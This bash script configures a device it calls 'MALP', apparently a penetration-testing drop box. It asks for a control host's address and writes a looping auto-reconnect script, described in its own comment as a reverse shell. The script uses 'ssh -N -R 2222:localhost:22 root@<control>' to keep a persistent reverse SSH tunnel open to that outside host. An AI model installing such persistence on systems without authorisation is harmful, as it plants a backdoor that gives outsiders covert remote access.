#!/bin/bash
#===========================
# Start init
#===========================
function pause(){
    echo 'Press any key to continue...';   read -p "$*"
}
#  End INIT

#=================================================
#===========  Start Main script ==================
#========= Version 1.0.1  7-18-2018 ==============
#=================================================
clear

#========================================
#== Change Control Internet Address =====
#========================================
while true; do
    clear
    echo "                  Reset Control Internet Location"
    echo " ____________________________________________________________________"
    echo " "
    echo "   The location of the Control computer may change after the initial. "
    echo "   configureation.  Putting this computer behind a firewall would be"
    echo "   a good idea.  You will need to enter the new IP address or FQDN" 
    echo "   of the control conputer.  You will also need to open port 22 of"
    echo "   and forwared that port to the control computer."
    echo " "
        read -p '  Enter the IP address or FQDN of the Control comptuer.......' controlvar
    echo " "
        read -p "Is the information you entered correct?(y/n) " yn
        case $yn in
            [Yy]* ) break;;
            * ) echo " ";;
        esac
done
cp /root/scripts/ssh_connect.sh /root/scripts/ssh_connect.bak
cat << EOF > /root/scripts/ssh_connect.sh
#!/bin/bash
#MALP Auto-Reconnection Script
#Modify this script with your parameters for establishing a reverse shell.

sleep 20

while true; do
	echo "Checking for SSH connections..."
	check=$(netstat -tnpa | awk '{print $7}' | grep ssh | tail -c 5 | grep -ic "/ssh")

	if [ $check -ge 1 ] 
	then
		echo "SSH connection active.  Checking again in 10 minutes..."
		sleep 10m
		continue
	else
		echo "No SSH connections active.  Attempting SSH connection..."
		ssh -N -R 2222:localhost:22 root@RRRR -p 22 &
		sleep 10m
		continue
	fi
done
EOF
chmod +x /root/scripts/ssh_connect.sh
sed -i "s|RRRR|$controlvar|g" /root/scripts/ssh_connect.sh
systemctl restart ssh_connect.service
echo ""
echo "   The change has been completed..."










